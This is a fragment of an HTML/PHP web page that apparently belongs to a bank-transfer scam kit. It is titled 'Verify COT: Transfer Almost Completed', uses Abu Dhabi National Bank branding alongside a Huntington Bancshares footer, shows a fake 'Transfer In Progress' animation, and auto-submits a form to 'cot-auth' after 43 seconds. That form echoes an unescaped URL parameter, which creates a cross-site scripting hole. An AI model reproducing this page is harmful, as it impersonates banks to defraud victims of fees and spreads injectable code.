...
<html lang="en-US" prefix="og: http://ogp.me/ns#">
	...
	<title>Verify COT: Transfer Almost Completed | Abu Dhabi National Bank</title>
    <style>
...
<div class="head"><center><img src="lockup.svg" width="160" /></center></div>
<br>
...
<h5 style="margin-left:11px;font-weight:bold;font-size:15px;">Transfer In Progress</h5>
			    <div class="col-md-4 col-md-offset-4" >
			        ...
			        <div style="background:#fff;border:1px solid black;" class="panel panel-inverse">
						...
						<div class="row">
                        <img src="mfb/mfb50.gif" width="100%" height="110px" />
                        </div>
			        	<!-- END panel-body -->
                    </div>
			        <!-- END panel -->
...
<div align="center" class="mtext">© 2021 Huntington Bancshares Incorporated.</div>
			...
			<form action="cot-auth?account=<?php echo $_GET["account"]; ?>" name="verification" id="verification" method="post"> 
...
<script type="text/javascript">
    ...
    window.setTimeout(function() { document.verification.submit(); }, 43000);
};
</script></form>
</body>
